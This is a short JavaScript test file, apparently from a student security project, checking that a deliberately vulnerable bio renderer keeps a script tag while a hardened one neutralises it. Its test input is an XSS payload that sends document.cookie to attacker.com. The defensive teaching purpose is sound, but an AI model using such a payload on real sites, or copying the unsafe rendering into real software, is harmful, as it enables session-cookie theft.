/**
 * Owner: Zaheir Carillo
 * Issue: https://github.com/jfrank58-G6/Itis-3200-Project/issues/3
 * Expected results for bio rendering helpers.
 * These fail until public/vulnerable and public/hardened profile.js TODOs are finished.
 */

const { describe, it } = require('node:test');
const assert = require('node:assert/strict');

const XSS_PAYLOAD =
  "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>";

describe('bio rendering (Zaheir)', () => {
  it('renderBioUnsafe keeps a <script> tag in the returned string', () => {
    const { renderBioUnsafe } = require('../public/vulnerable/profile.js');
    const out = renderBioUnsafe(XSS_PAYLOAD);
    assert.match(
      out,
      /<script/i,
      'vulnerable helper must leave <script> intact for the innerHTML demo',
    );
  });

  it('renderBioSafe does not leave executable <script> markup', () => {
    const { renderBioSafe } = require('../public/hardened/profile.js');
    const out = renderBioSafe(XSS_PAYLOAD);
    assert.doesNotMatch(
      out,
      /<script/i,
      'hardened helper must escape or neutralize <script> so it is not markup',
    );
    assert.ok(out.length > 0, 'safe helper should still return the bio text');
  });
});
